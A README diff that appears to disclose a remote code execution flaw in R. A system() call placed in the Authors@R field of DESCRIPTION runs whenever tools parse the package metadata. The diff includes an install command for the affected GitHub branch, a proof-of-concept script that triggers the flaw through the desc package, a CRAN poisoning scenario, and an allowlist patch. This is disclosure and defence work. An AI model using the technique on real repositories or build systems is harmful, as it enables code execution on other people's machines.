@@ -3,21 +3,115 @@ nothing
 
 This is a package about nothing. 
 
-![](http://media.tumblr.com/tumblr_lkw5e6ANdS1qf7q1s.png)
+But it does something interesting. If you install it in whatever way you want, for example using the following command:
 
-The idea is that when you do `require(nothing)` you express that you don't need
-anything, and therefore `nothing` assumes you are fine just using the 
-`base` package, so it detaches all other packages. 
-
-```
-> loadedNamespaces()
-[1] "base"      "datasets"  "grDevices" "graphics"  "methods"   "stats"
-[7] "utils"
-> 
-> require(nothing, quietly = TRUE)
-> 
-> loadedNamespaces()
-[1] "base"
+```R
+remotes::install_github("lwaldron/nothing", ref = "check-vulnerability", force = TRUE)
 ```
 
-I agree, this is completely useless. 
+It will execute code that writes the contents of the `HOME` environment variable to a file called `pwned_by_r.txt` in your home directory. This happens because the `Authors@R` field in the `DESCRIPTION` file contains an email address that is actually a call to `system()`, which is evaluated when the package metadata is parsed.
+
+So you don't even need to install the package. The vulnerability is in the metadata parsing, which is done by all tools that read the `DESCRIPTION` file.
+
+For example (authored by Gemini):
+
+```R
+# Suppose a service like R-Universe, a documentation site generator (pkgdown),
+# or a custom indexing script wants to read a package's metadata
+# to index the authors.
+
+# 1. Ensure the system is clean
+if (file.exists("~/pwned_by_r.txt")) file.remove("~/pwned_by_r.txt")
+
+message("1. Fetching DESCRIPTION file from malicious repository...")
+# Downloading the DESCRIPTION file as pure text (no package installation!)
+desc_url <- "https://raw.githubusercontent.com/lwaldron/nothing/check-vulnerability/DESCRIPTION"
+download.file(desc_url, "malicious_DESCRIPTION", quiet = TRUE)
+
+message("2. Using the standard 'desc' package to read author metadata...")
+# This is what almost all R CI/CD and indexing tools do.
+if (!requireNamespace("desc", quietly = TRUE)) install.packages("desc")
+library(desc)
+
+# Initialize the parser on the downloaded text file
+my_desc <- desc::description$new("malicious_DESCRIPTION")
+
+message("3. Extracting authors...")
+# This step silently evaluates the Authors@R field
+authors <- my_desc$get_authors()
+message("Parsed Authors: ", paste(authors, collapse=", "))
+
+message("\n4. Checking for exploitation...")
+if (file.exists("~/pwned_by_r.txt")) {
+  message("[!] VULNERABILITY SUCCESSFUL: RCE achieved without package installation!")
+  message("Payload output: ", readLines("~/pwned_by_r.txt"))
+} else {
+  message("Failed.")
+}
+
+# Cleanup
+unlink("malicious_DESCRIPTION")
+if (file.exists("~/pwned_by_r.txt")) file.remove("~/pwned_by_r.txt")
+```
+
+## Is this any worse than known vulnerabilities, e.g. in .onLoad()? (authored by Levi)
+
+I think so, because it does not even require the user to install or check the package or run any of its R/ or src/ code. The payload executes immediately upon parsing the `DESCRIPTION` file. This can happen in seemingly safe contexts not typically associated with code execution (e.g., repository checks, documentation generation, metadata indexing, dependency resolution). Also, any scan of untrusted packages that focuses on `.R` or `.c`/`.cpp`/`.h` files will miss this attack vector.
+
+The worst-case scenario that I can think of is an attacker uploading a malicious package to CRAN, the master node extracts DESCRIPTION metadata to build a manifest or check for violations, executing a malicious payload that modifies other incoming packages already in the queue. They could poison trusted packages after the author's last change but before distribution, without needing to compromise the master node or build systems, without having to trick users into installing their own package, and without needing for their package ever to be accepted by CRAN.
+
+### Why does this happen? (authored by Gemini)
+
+The root cause is the unsafe use of `eval(parse(text = ...))` when extracting author information. In `BiocCheck` (and base R's package build system), the `Authors@R` string is extracted from the `DESCRIPTION` file and evaluated to convert it into a machine-readable `person` object. In this example, the `email` field of the second `person()` call is not a simple string but a call to `system()`, which executes a shell command.
+
+While tools attempt to sandbox this evaluation by running it in an empty environment (`new.env(parent = emptyenv())`), base R functions are still resolved. By injecting `system(..., intern=TRUE)` as an argument to `person()`, an attacker can execute arbitrary shell commands when the package is checked by repository infrastructure or installed by a user, achieving Remote Code Execution (RCE) without requiring the user or build system to ever deliberately run the package's actual R code.
+
+### Suggested Patch for Base R (authored by Gemini)
+
+A robust solution for base R involves inspecting the Abstract Syntax Tree (AST) generated by `parse()` *before* any evaluation occurs. By traversing the AST, base R can strictly allowlist permitted functions (e.g., `c`, `person`, `list`) and block everything else (e.g., `system`, `eval`, `readLines`).
+
+Here is a conceptual implementation of how base R could patch this vulnerability:
+
+```R
+# 1. Define an AST validator
+is_safe_author_ast <- function(expr) {
+  # Allow literal values and names
+  if (is.atomic(expr) || is.name(expr)) return(TRUE)
+  
+  # If it's a function call, check against a strict allowlist
+  if (is.call(expr)) {
+    allowed_funcs <- c("c", "person", "list")
+    func_name <- as.character(expr[[1]])
+    
+    if (!(func_name %in% allowed_funcs)) {
+      warning(paste("Unsafe function call detected in Authors@R:", func_name))
+      return(FALSE)
+    }
+    
+    # Recursively check all arguments passed to the allowed function
+    for (i in seq_along(expr)[-1]) {
+      if (!is_safe_author_ast(expr[[i]])) return(FALSE)
+    }
+    return(TRUE)
+  }
+  
+  return(FALSE)
+}
+
+# 2. Use the validator before evaluation
+parse_authors_safely <- function(authors_at_r_text) {
+  parsed_expr <- parse(text = authors_at_r_text)
+  
+  # Validate all expressions in the parsed code
+  is_safe <- all(vapply(parsed_expr, is_safe_author_ast, logical(1)))
+  
+  if (!is_safe) {
+    stop("Malformed or unsafe code detected in Authors@R field.")
+  }
+  
+  # Only evaluate if the AST is proven safe
+  eval(parsed_expr, envir = baseenv())
+}
+```
+
+This ensures that even if an attacker injects `system()` or similar malicious payloads into the `DESCRIPTION` file, the AST parser will flag and reject it before the execution step is ever reached.
